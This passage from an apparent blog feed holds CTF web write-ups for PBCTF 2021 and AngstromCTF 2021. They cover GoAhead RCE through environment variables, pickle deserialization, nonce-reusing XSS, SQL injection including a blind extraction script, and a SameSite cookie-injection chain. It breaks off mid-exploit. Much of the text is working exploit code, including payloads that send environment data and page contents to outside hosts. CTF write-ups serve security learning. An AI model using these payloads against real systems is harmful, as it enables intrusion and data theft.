&lt;h3 id=&#34;first-method-rce-worked-in-the-challenge&#34;&gt;First method RCE (worked in the challenge):&lt;/h3&gt;
&lt;p&gt;So now that we are able to set any environment variables, we started digging on how we would  achieve RCE. The first idea we got is to use the known &lt;code&gt;LD_PRELOAD &lt;/code&gt; trick, if we manage to upload our shared library in the server with a known path we will have our win but it won&amp;rsquo;t be that easy so we will talk more in details about this approach in the next section.&lt;/p&gt;
&lt;p&gt;After a lot of tries and reflection, @st98 senpai sent this interesting 
&lt;a href=&#34;https://www.elttam.com/blog/env/#content&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;article&lt;/a&gt;, it&amp;rsquo;s talking about achieving RCE while running a python script by using &lt;code&gt;PYTHONWARNINGS&lt;/code&gt; &lt;code&gt;BROWSER&lt;/code&gt; and &lt;code&gt;PERL5OPT&lt;/code&gt; variables. You can find more details about this method in the article mentioned below. So here is our final exploit written by @st98 senpai:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python=&#34;&gt;import socket

#s = socket.create_connection((&#39;localhost&#39;, 5000))
s = socket.create_connection((&#39;advancement.chal.perfect.blue&#39;, 80))
payload = &#39;&#39;&#39;--------------------------58ffd05745ad3119
Content-Disposition: form-data; name=&amp;quot;PYTHONWARNINGS&amp;quot;

all:0:antigravity.x:0:0
--------------------------58ffd05745ad3119
Content-Disposition: form-data; name=&amp;quot;BROWSER&amp;quot;

perlthanks
--------------------------58ffd05745ad3119
Content-Disposition: form-data; name=&amp;quot;PERL5OPT&amp;quot;

-Mbase;print(system(&amp;quot;cat&amp;quot;.chr(0x20).&amp;quot;/flag&amp;quot;));exit;
--------------------------58ffd05745ad3119--
&#39;&#39;&#39;.replace(&#39;\n&#39;, &#39;\r\n&#39;).encode()
#payload = payload.replace(b&#39;FILE&#39;, open(&#39;nekodesu.so&#39;, &#39;rb&#39;).read())
l = len(payload)

body = f&#39;&#39;&#39;POST /cgi-bin/date HTTP/1.1
Host: localhost:55555
User-Agent: curl/7.68.0
Accept: */*
Content-Length: {l}
Content-Type: multipart/form-data; boundary=------------------------58ffd05745ad3119

&#39;&#39;&#39;.replace(&#39;\n&#39;, &#39;\r\n&#39;).encode() + payload

s.send(body)
print(s.recv(1024).decode())
s.close()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;or using curl as follow:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;curl -F &amp;quot;PYTHONWARNINGS=all:0:antigravity.x:0:0&amp;quot; -F &amp;quot;BROWSER=perlthanks&amp;quot; -F &#39;PERL5OPT=-Mbase;print(system(&amp;quot;cat&amp;quot;.chr(0x20).&amp;quot;/flag&amp;quot;));exit;&#39; http://advancement.chal.perfect.blue
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;second-method-rce-didnt-work-on-the-challenge&#34;&gt;Second Method RCE (Didn&amp;rsquo;t work on the challenge)&lt;/h3&gt;
&lt;p&gt;As mentioned before, we stick a lot of time trying the &lt;code&gt;LD_PRELOAD&lt;/code&gt; trick, but unfortunately we can see in the challenge docker-compose file that &lt;code&gt;    read_only: true&lt;/code&gt; so forcing an upload will always throw an error since the temporary files created while uploading will be stored in &lt;code&gt;/etc/goahead/tmp&lt;/code&gt; . The &lt;code&gt;/tmp&lt;/code&gt; is writable so at first I thought that we have maybe to find another vulnerability while forging the path of the temporary file but we had no luck.&lt;/p&gt;
&lt;p&gt;After the end of the CTF, I didn&amp;rsquo;t give up on this idea and sticked trying it in a normal environment with writable FS. You may be asking now that even if we managed to upload the shared library we will still have to brute force/guess the name of the temporary file ? In fact after some intense code review of the upload component I noticed the following while handling the uploaded file &lt;strong&gt;
&lt;a href=&#34;https://github.com/embedthis/goahead/blob/master/src/upload.c#L240&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;L240&lt;/a&gt;&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c=&#34;&gt;wfree(wp-&amp;gt;uploadTmp);
 if ((wp-&amp;gt;uploadTmp = websTempFile(uploadDir, &amp;quot;tmp&amp;quot;)) == 0) {
          websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR,
          &amp;quot;Cannot create upload temp file %s. Check upload temp dir %s&amp;quot;, wp-&amp;gt;uploadTmp, uploadDir);
          return;
      }
      trace(5, &amp;quot;File upload of: %s stored as %s&amp;quot;, wp-&amp;gt;clientFilename, wp-&amp;gt;uploadTmp);

if ((wp-&amp;gt;upfd = open(wp-&amp;gt;uploadTmp, O_WRONLY | O_CREAT | O_TRUNC | O_BINARY, 0600)) &amp;lt; 0) {
        websError(wp, HTTP_CODE_INTERNAL_SERVER_ERROR, &amp;quot;Cannot open upload temp file %s&amp;quot;, wp-&amp;gt;uploadTmp);
        return;
        }
               
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The webserver is opening the file so we may abuse the opened file descriptor and for example set the &lt;code&gt;LD_PRELOAD=/proc/self/fd/6&lt;/code&gt; while forcing a file upload of the shared library. We can do it using the following command:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;curl -v -F &amp;quot;data=@payload.so&amp;quot; -F &amp;quot;LD_PRELOAD=/proc/self/fd/6&amp;quot; http://advancement.chal.perfect.blue/cgi-bin/date
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;with &lt;code&gt;payload.so&lt;/code&gt;  having the following before compiling it:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;unistd.h&amp;gt;

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    system(&amp;quot;cat /etc/passwd&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However, this method have some constraints that make it hard to exploit :/
&lt;strong&gt;1-&lt;/strong&gt; We have to guess the file descriptor number ( We can bruteforce it easily)
&lt;strong&gt;2-&lt;/strong&gt; Weirdly goahead had different behaviours that I didn&amp;rsquo;t really understand depending on different environements, it throws an internal server error for an unknown reason sometimes. ( Please if you manage to know why DM me )&lt;/p&gt;
&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion:&lt;/h3&gt;
&lt;p&gt;PBCTF 2021 was really fun and hard, it had some awesome challenges that required finding a 0-day in some products in order to solve them, so it was a highly realistic CTF. Kudos to all my awesome teammates in Zer0pts that have really motivated me to be more dedicated to CTFs and learned a lot from them.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>AngstromCTF Web Writeups</title>
      <link>https://ahmed-belkahla.me/post/angstromctf_web/</link>
      <pubDate>Sun, 11 Apr 2021 00:20:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/angstromctf_web/</guid>
      <description>&lt;p&gt;Finally after finishing my exams , I had the opportunity to participate in the last 2 days of AngstromCTF with my team Fword and managed to solve all the web challenges except the last 3 tasks, unfortunately I didn&amp;rsquo;t have the chance to try the last two ones , bad subjects at school are always keeping me from playing CTFs and learning useful stuffs :( !
However, I have really liked the web challenges especially the client side ones, we will go through all the tasks so let&amp;rsquo;s begin.&lt;/p&gt;
&lt;h2 id=&#34;jar&#34;&gt;Jar&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/JEzoi9Q.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This task was straightforward, as we can see in the source code it&amp;rsquo;s clearly an unsafe pickle deserialization vulnerability&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;@app.route(&#39;/add&#39;, methods=[&#39;POST&#39;])
def add():
        contents = request.cookies.get(&#39;contents&#39;)
        if contents: items = pickle.loads(base64.b64decode(contents))
        else: items = []
        items.append(request.form[&#39;item&#39;])
        response = make_response(redirect(&#39;/&#39;))
        response.set_cookie(&#39;contents&#39;, base64.b64encode(pickle.dumps(items)))
        return response
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can generate our payload with the following script to achieve RCE and exfiltrate the flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle,base64
class exploit(object):
        def __reduce__(self):
                import os
                return (os.system,(&#39;wget https://SERVER/?a=`env|base64|tr -d &amp;quot;\n&amp;quot;`&#39;,))
base64.b64encode(pickle.dumps(exploit()))

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then we only have to change &lt;strong&gt;contents&lt;/strong&gt; cookie with our payload :D&lt;/p&gt;
&lt;h2 id=&#34;sea-of-quills&#34;&gt;Sea of Quills &lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/A8C9uwR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;As we can see in the source code it&amp;rsquo;s an SQL injection with some filters.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;
post &#39;/quills&#39; do
        db = SQLite3::Database.new &amp;quot;quills.db&amp;quot;
        cols = params[:cols]
        lim = params[:limit]
        off = params[:offset]

        blacklist = [&amp;quot;-&amp;quot;, &amp;quot;/&amp;quot;, &amp;quot;;&amp;quot;, &amp;quot;&#39;&amp;quot;, &amp;quot;\&amp;quot;&amp;quot;]

        blacklist.each { |word|
                if cols.include? word
                        return &amp;quot;beep boop sqli detected!&amp;quot;
                end
        }


        if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
                return &amp;quot;bad, no quills for you!&amp;quot;
        end

        @row = db.execute(&amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off])

        p @row

        erb :specific
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;we can inject the following in cols part to get our flag (after performing the usual steps to find the column and table name)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1,flag,2 from flagtable union select 1,2,3 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And Bingo we got our flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/RQFlr3j.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;nomnomnom&#34;&gt;nomnomnom&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/V2LXwDj.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;It was a client-side task, our goal is to leak the admin page&amp;rsquo;s source code in order to get the flag so we have to find a way and get an XSS. Reviewing the source code we can spot a possible injection sink in the &lt;strong&gt;share name&lt;/strong&gt; but unfortunately
the page is protected with a strict CSP , the only way to execute javascript (as far as I know) is using the nonce value which is randomly generated on every request.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.get(&#39;/shares/:shareName&#39;, function(req, res) {
        // TODO: better page maybe...? would attract those sweet sweet vcbucks
        if (!(req.params.shareName in shares)) {
                return res.status(400).send(&#39;hey that share doesn\&#39;t exist... are you a time traveller :O&#39;);
        }

        const share = shares[req.params.shareName];
        const score = share.score;
        const name = share.name;
        const nonce = crypto.randomBytes(16).toString(&#39;hex&#39;);
        let extra = &#39;&#39;;

        if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
                extra = `deletion token: &amp;lt;code&amp;gt;${process.env.FLAG}&amp;lt;/code&amp;gt;`
        }

        return res.send(`
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
        &amp;lt;head&amp;gt;
                &amp;lt;meta http-equiv=&#39;Content-Security-Policy&#39; content=&amp;quot;script-src &#39;nonce-${nonce}&#39;&amp;quot;&amp;gt;
                &amp;lt;title&amp;gt;snek nomnomnom&amp;lt;/title&amp;gt;
        &amp;lt;/head&amp;gt;
        &amp;lt;body&amp;gt;
                ${extra}${extra ? &#39;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&#39; : &#39;&#39;}
                &amp;lt;h2&amp;gt;snek goes &amp;lt;em&amp;gt;nomnomnom&amp;lt;/em&amp;gt;&amp;lt;/h2&amp;gt;&amp;lt;br /&amp;gt;
                Check out this score of ${score}! &amp;lt;br /&amp;gt;
                &amp;lt;a href=&#39;https://ahmed-belkahla.me/&#39;&amp;gt;Play!&amp;lt;/a&amp;gt; &amp;lt;button id=&#39;reporter&#39;&amp;gt;Report.&amp;lt;/button&amp;gt; &amp;lt;br /&amp;gt;
                &amp;lt;br /&amp;gt;
                This score was set by ${name}
                &amp;lt;script nonce=&#39;${nonce}&#39;&amp;gt;
function report() {
        fetch(&#39;/report/${req.params.shareName}&#39;, {
                method: &#39;POST&#39;
        });
}

document.getElementById(&#39;reporter&#39;).onclick = () =&amp;gt; { report() };
                &amp;lt;/script&amp;gt; 

        &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;`);
});

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The first thing I tried was using markup dangling technique in order to leak the nonce and reuse it maybe but it was not possible in this case . After some tries and fails I thought that maybe if I can abuse the
already written nonce and somehow include it in a script tag I inject. Injecting the following payload in the share&amp;rsquo;s name will lead us to use the nonce with our own src attribute&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;script src=http://SERVER/app.js 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;How it&amp;rsquo;s interpreted:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/LOe0BL1.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And we host app.js file on our server with the following content , the bot didn&amp;rsquo;t have fetch api so I used XMLHttpRequest.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( &amp;quot;GET&amp;quot;, theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
httpGet(&amp;quot;https://webhook.site/b494ae6c-c6f2-4ea2-b915-47e22ed4c076/?a=&amp;quot;+btoa(document.body.innerHTML));

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally you only have to report the share to the admin and get the beloved flag :D&lt;/p&gt;
&lt;h2 id=&#34;reactionpy&#34;&gt;Reaction.py&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/b674MEG.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We are provided with the source code of the website, it&amp;rsquo;s a simple website with a register and login functionalities, after registering you will have a page where you can crete some predefined modules. This the most interesting function:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/QZFghFT.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def add_component(name, cfg, bucket):
    if not name or not cfg:
        return (ERR, &amp;quot;Missing parameters&amp;quot;)
    if len(bucket) &amp;gt;= 2:
        return (ERR, &amp;quot;Bucket too large (our servers aren&#39;t very good :((((()&amp;quot;)
    if len(cfg) &amp;gt; 250:
        return (ERR, &amp;quot;Config too large (our servers aren&#39;t very good :((((()&amp;quot;)
    if name == &amp;quot;welcome&amp;quot;:
        if len(bucket) &amp;gt; 0:
            return (ERR, &amp;quot;Welcomes can only go at the start&amp;quot;)
        bucket.append(
            &amp;quot;&amp;quot;&amp;quot;
            &amp;lt;form action=&amp;quot;/newcomp&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
                &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot; placeholder=&amp;quot;component name&amp;quot;&amp;gt;
                &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;cfg&amp;quot; placeholder=&amp;quot;component config&amp;quot;&amp;gt;
                &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;create component&amp;quot;&amp;gt;
            &amp;lt;/form&amp;gt;
            &amp;lt;form action=&amp;quot;/reset&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
                &amp;lt;p&amp;gt;warning: resetting components gets rid of this form for some reason&amp;lt;/p&amp;gt;
                &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;reset components&amp;quot;&amp;gt;
            &amp;lt;/form&amp;gt;
            &amp;lt;form action=&amp;quot;/contest&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
                &amp;lt;div class=&amp;quot;g-recaptcha&amp;quot; data-sitekey=&amp;quot;{}&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
                &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;submit site to contest&amp;quot;&amp;gt;
            &amp;lt;/form&amp;gt;
            &amp;lt;p&amp;gt;Welcome &amp;lt;strong&amp;gt;{}&amp;lt;/strong&amp;gt;!&amp;lt;/p&amp;gt;
            &amp;quot;&amp;quot;&amp;quot;.format(
                captcha.get(&amp;quot;sitekey&amp;quot;), escape(cfg)
            ).strip()
        )
    elif name == &amp;quot;char_count&amp;quot;:
        bucket.append(
            &amp;quot;&amp;lt;p&amp;gt;{}&amp;lt;/p&amp;gt;&amp;quot;.format(
                escape(
                    f&amp;quot;&amp;lt;strong&amp;gt;{len(cfg)}&amp;lt;/strong&amp;gt; characters and &amp;lt;strong&amp;gt;{len(cfg.split())}&amp;lt;/strong&amp;gt; words&amp;quot;
                )
            )
        )
    elif name == &amp;quot;text&amp;quot;:
        bucket.append(&amp;quot;&amp;lt;p&amp;gt;{}&amp;lt;/p&amp;gt;&amp;quot;.format(escape(cfg)))
    elif name == &amp;quot;freq&amp;quot;:
        counts = Counter(cfg)
        (char, freq) = max(counts.items(), key=lambda x: x[1])
        bucket.append(
            &amp;quot;&amp;lt;p&amp;gt;All letters: {}&amp;lt;br&amp;gt;Most frequent: &#39;{}&#39;x{}&amp;lt;/p&amp;gt;&amp;quot;.format(
                &amp;quot;&amp;quot;.join(counts), char, freq
            )
        )
    else:
        return (ERR, &amp;quot;Invalid component name&amp;quot;)
    return (OK, bucket)


&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can notice that we can only submit two modules, we have a reset feature to wipe all the created modules and all our input is well sanitized except all the letters used in &lt;strong&gt;freq&lt;/strong&gt; module. Taking into consideration all the constraints
we have, we can only inject two times (because of the maximum number of modules), the non sanitized input is passed to &lt;strong&gt;Collectons.Counter&lt;/strong&gt; so every duplicated character will be removed which prevent us from injecting all the payload .&lt;/p&gt;
&lt;p&gt;Burp request to reset the modules:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/en49sjU.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I started struggling a little bit here and tried passing the component config as an array (I noticed when testing locally that when passing an array to Collections.Counter it won&amp;rsquo;t remove dup chars) but it didn&amp;rsquo;t lead me anywhere.&lt;/p&gt;
&lt;p&gt;After watching some anime, I took another look at the challenge and got the idea to split my payload and inject it separately in the two modules, firstly we can inject &lt;code&gt;&amp;lt;script&amp;gt;/*&lt;/code&gt; in the &lt;strong&gt;freq&lt;/strong&gt; module ( Input is not sanitized so we can safely open a script tag)
and the &lt;code&gt;/*&lt;/code&gt; to comment all the garbage between the two modules and then inject our second payload &lt;code&gt;*/function r(u){var c=new XMLHttpRequest();c.withCredentials=true;c.open(`GET`,u,false);c.send(null);return c.responseText;}var b=r(`http://127.0.0.1:8080/?fakeuser=admin`);fetch(`https://SERVER/?a=`%2Bbtoa(b));// &lt;/code&gt; in &lt;strong&gt;text&lt;/strong&gt; module ( we have to make sure that it will not contain any characters that can be escaped ). I used the backtick instead of the quotation marks.&lt;/p&gt;
&lt;p&gt;This is the final result after injecting:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/IO30QBL.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Finally to report our page to the admin we had to manually add the report form and the script tag of the recaptcha. After visiting our page we receive the source code containing the flag:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/s6TCqST.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;sea-of-quills-2&#34;&gt;Sea of Quills 2Â ##&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/RjA6RVw.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This was a second version of the first SQL injection task but with more strict filters, this is the most interesting part of the source code:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;
post &#39;/quills&#39; do
        db = SQLite3::Database.new &amp;quot;quills.db&amp;quot;
        cols = params[:cols]
        lim = params[:limit]
        off = params[:offset]

        blacklist = [&amp;quot;-&amp;quot;, &amp;quot;/&amp;quot;, &amp;quot;;&amp;quot;, &amp;quot;&#39;&amp;quot;, &amp;quot;\&amp;quot;&amp;quot;, &amp;quot;flag&amp;quot;]

        blacklist.each { |word|
                if cols.include? word
                        return &amp;quot;beep boop sqli detected!&amp;quot;
                end
        }

        puts &amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off]
        if cols.length &amp;gt; 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
                return &amp;quot;bad, no quills for you!&amp;quot;
        end

        puts &amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off]
        @row = db.execute(&amp;quot;select %s from quills limit %s offset %s&amp;quot; % [cols, lim, off])


        p @row

        erb :specific
end

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The most attentive readers may have noticed that cols parameter length is limited to 24 characters now and it can&amp;rsquo;t include the word flag :( The first idea I got is to try passing an array to cols parameter in order to bypass the filters but unfortunately I couldn&amp;rsquo;t get rid of the brackets that were causing an sqlite error. This is the resulting SQL query after passing &lt;strong&gt;cols&lt;/strong&gt; as an array ( cols[]=input ):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select [&amp;quot;input&amp;quot;] from quills limit 10 offset 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After some fails I remembered that regex matching in ruby can be broken using \n , I was so dumb to forget something this important. I opted to the following payload in limit parameter to perform a blind SQL injection:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20&amp;quot;{sub}&amp;quot;%20);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;%0a&lt;/strong&gt; to break the regex and escape it , then we will iterate over all the characters of the flag , if we have a correct letter the response will contain the values passed in cols as mentioned in the picture below :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/BDSTqTQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is my final exploit to exfiltrate the flag char by char:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
import string,requests
from urllib.parse import unquote
data={&amp;quot;offset&amp;quot;:&amp;quot;7&amp;quot;,&amp;quot;cols&amp;quot;:&amp;quot;999999999,5,6&amp;quot;}
url=&amp;quot;https://seaofquills-two.2021.chall.actf.co/quills&amp;quot;
chars=string.printable
flag=&amp;quot;&amp;quot;
i=36
print(&amp;quot;[+] Started&amp;quot;)
while &amp;quot;}&amp;quot; not in flag:
        for char in chars:
                payload=&#39;10%0a%20and%20((select%20substr(flag,{count},1)%20from%20flagtable)%20%3d%3d%20&amp;quot;{sub}&amp;quot;%20);&#39;.format(count=str(i),sub=char)
                data[&amp;quot;limit&amp;quot;]=unquote(payload)
                r=requests.post(url,data=data)
                if &amp;quot;999999999&amp;quot; in r.text:
                        flag=flag+char
                        i=i+1
                        print(&amp;quot;[+] &amp;quot;+flag)
                        break


&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;spoofy&#34;&gt;Spoofy&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/QAbO9JZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We are given the source code as always ( Best thing about this CTF ), we have to pass the following check in order to get the flag.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
    if &amp;quot;X-Forwarded-For&amp;quot; in request.headers:
        # https://stackoverflow.com/q/18264304/
        # Some people say first ip in list, some people say last
        # I don&#39;t know who to believe
        # So just believe both
        ips: List[str] = request.headers[&amp;quot;X-Forwarded-For&amp;quot;].split(&amp;quot;, &amp;quot;)
        if not ips:
            return text_response(&amp;quot;How is it even possible to have 0 IPs???&amp;quot;, 400)
        if ips[0] != ips[-1]:
            return text_response(
                &amp;quot;First and last IPs disagree so I&#39;m just going to not serve this request.&amp;quot;,
                400,
            )
        ip: str = ips[0]
        if ip != &amp;quot;1.3.3.7&amp;quot;:
            return text_response(&amp;quot;I don&#39;t trust you &amp;gt;:(&amp;quot;, 401)
        return text_response(&amp;quot;Hello 1337 haxx0r, here&#39;s the flag! &amp;quot; + FLAG)
    else:
        return text_response(&amp;quot;Please run the server through a proxy.&amp;quot;, 400)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The application is hosted in Heroku , in fact heroku will append your real ip to the X-Forwarded-For header so it seems impossible to satisfy the mentioned conditions since our real ip is not 1.3.3.7 . The bypass is simple , we can pass
the X-Forwarded-For header twice and heroku&amp;rsquo;s router will append our real ip to the first one then the two headers will be concatenated :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Hib9xam.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;jason&#34;&gt;Jason&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/vXCDntA.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I have particularly enjoyed this challenge but I was really stupid and solved it just after the CTF ended. In fact the admin bot was using headless chrome and I was testing my exploit on firefox which had a different behaviour :( We have the source code as always , the website is simple we have a report functionality and a simple passcode keyboard.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bNFep2h.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const jason = require(&#39;./jason&#39;)

const express = require(&#39;express&#39;)
const bodyParser = require(&#39;body-parser&#39;)
const cookieParser = require(&#39;cookie-parser&#39;)

const app = express()

function sameOrigin (req, res, next) {
        if (req.get(&#39;referer&#39;) &amp;amp;&amp;amp; !req.get(&#39;referer&#39;).startsWith(process.env.URL))
                return res.sendStatus(403)
        return next()
}

app.use(bodyParser.urlencoded({ extended: false }))
app.use(cookieParser())

app.use(express.static(&#39;public&#39;))

app.post(&#39;/passcode&#39;, function (req, res) {
        if (req.body.passcode === &#39;CLEAR&#39;) res.append(&#39;Set-Cookie&#39;, &#39;passcode=&#39;)
        else res.append(&#39;Set-Cookie&#39;, `passcode=${(req.cookies.passcode || &#39;&#39;)+req.body.passcode}`)
        return res.redirect(&#39;/&#39;)
})

app.post(&#39;/visit&#39;, async function (req, res) {
        if (req.body.site.startsWith(&#39;http&#39;)) try {await jason.visit(req.body.site) } catch (e) {console.log(e)}
        return res.redirect(&#39;/&#39;)
})

app.get(&#39;/languages&#39;, sameOrigin, function (req, res) {
        res.jsonp({category: &#39;languages&#39;, items: [&#39;C++&#39;, &#39;Rust&#39;, &#39;OCaml&#39;, &#39;Lisp&#39;, &#39;Physical touch&#39;]})
})

app.get(&#39;/friends&#39;, sameOrigin, function (req, res) {
        res.jsonp({category: &#39;friends&#39;, items: [&#39;Functional programming&#39;]})
})

app.get(&#39;/flags&#39;, sameOrigin, function (req, res) {
        if (req.cookies.passcode !== process.env.PASSCODE) return res.sendStatus(403)
        res.jsonp({category: &#39;flags&#39;, items: [process.env.FLAG]})
})

app.listen(7331)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can notice that we have to find a way to load the /flags jsonp endpoint so we have to bypass firstly the sameOrigin middleware check and find a way to send the passcode cookie in the cross origin request. The first check about sameOrigin is easy to bypass if we set
&lt;strong&gt;referrer-policy&lt;/strong&gt; to &lt;strong&gt;no-referrer&lt;/strong&gt;, the problem is the second part about cookies because the default behaviour of chrome is to set the SameSite attribute to lax if no SameSite attribute is specified which prevents sending cookies in cross origin requests ( More 
&lt;a href=&#34;https://www.chromium.org/updates/same-site/faq&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Details&lt;/a&gt; ).&lt;/p&gt;
&lt;p&gt;We can notice that we have a possible injection in  Set-Cookie response header so we can inject &lt;strong&gt;;SameSite=None; Secure&lt;/strong&gt; in order to permit cookies to be sent in cross site requests. There is a little piece missing which is how to send the post request in order to inject the SameSite attribute,  the idea here is to opt to &lt;strong&gt;Lax + POST mitigation&lt;/strong&gt; which enables the cookie to be sent on a top-level cross-site POST request as you can see in the link provided.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s recapitulate , our chain will be as following:&lt;/p&gt;
&lt;p&gt;First we send a post request to /passcode from a top level window in order to inject &lt;strong&gt;;SameSite=None; Secure&lt;/strong&gt; then we call script tag with a src as &lt;strong&gt;/flags&lt;/strong&gt; and referrer-policy set to no-referrer, This was my final exploit:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;
from flask import Flask
import time

app = Flask(__name__)

@app.route(&#39;/delay&#39;)
def delay():
        time.sleep(9)
        return &amp;quot;zeu&amp;quot;

@app.route(&#39;/form&#39;)
def form():
        return &amp;quot;&amp;quot;&amp;quot;
&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;form method=&#39;post&#39; id=&#39;hack&#39; action=&#39;https://jason.2021.chall.actf.co/passcode&#39;&amp;gt;
&amp;lt;input type=&#39;text&#39; name=&#39;passcode&#39; value=&#39;;SameSite=None; Secure&#39;&amp;gt;
